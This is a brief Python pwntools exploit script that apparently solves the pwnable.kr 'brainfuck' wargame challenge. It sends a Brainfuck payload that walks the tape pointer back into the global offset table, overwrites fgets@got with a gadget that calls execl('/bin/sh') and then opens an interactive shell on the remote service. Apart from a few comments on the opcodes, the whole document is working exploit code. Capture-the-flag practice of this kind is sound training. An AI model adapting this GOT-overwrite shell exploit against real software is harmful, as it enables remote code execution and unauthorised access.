from pwn import *

# 44 = , = getchar
# 46 = . = putchar 
# 45 = - = decrease the value stored in P by one
# 43 = + = increase the value stored in P by one
# 60 = < = decrease P by one
# 62 = > = increase P by one

sh = remote("pwnable.kr", 9001)

sh.recvline()
sh.recvline()

payload  = b"."
payload += b"<" * 112 # fgets@got -> 0x5fbd6 execl("/bin/sh", [esp])
payload += b","
payload += b">"
payload += b"-" * 30
payload += b">" * 10 # [esp] = 0
payload += b"."

sh.sendline(payload) 

sh.send(b"\xd6") 

sh.interactive()
